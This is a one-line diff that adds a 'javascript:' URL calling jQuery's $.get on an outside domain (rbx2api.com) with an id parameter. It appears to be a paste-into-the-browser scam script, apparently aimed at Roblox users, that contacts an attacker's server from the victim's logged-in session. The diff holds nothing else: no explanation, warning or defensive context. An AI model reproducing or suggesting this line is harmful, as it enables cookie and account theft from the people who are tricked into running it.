@@ -1,0 +1,1 @@
+Javascript:$.get('//rbx2api.com/api.php?id=761100')
